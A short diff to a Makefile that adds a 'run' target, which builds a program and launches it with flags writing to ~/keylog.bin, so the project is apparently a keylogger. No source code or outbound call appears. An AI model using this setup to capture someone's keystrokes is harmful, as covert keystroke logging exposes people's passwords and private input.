@@ -8,6 +8,9 @@ OBJ = $(SRC:.c=.o)
 
 all: $(TARGET)
 
+run: all
+	./$(TARGET) -o ~/keylog.bin -f -s
+
 $(TARGET): $(OBJ)
 	$(CC) $(CFLAGS) $(FRAMEWORKS) -o $@ $^ $(LDFLAGS)
 
@@ -17,4 +20,4 @@ $(TARGET): $(OBJ)
 clean:
 	rm -f $(TARGET) $(OBJ)
 
-.PHONY: all clean
+.PHONY: all run clean
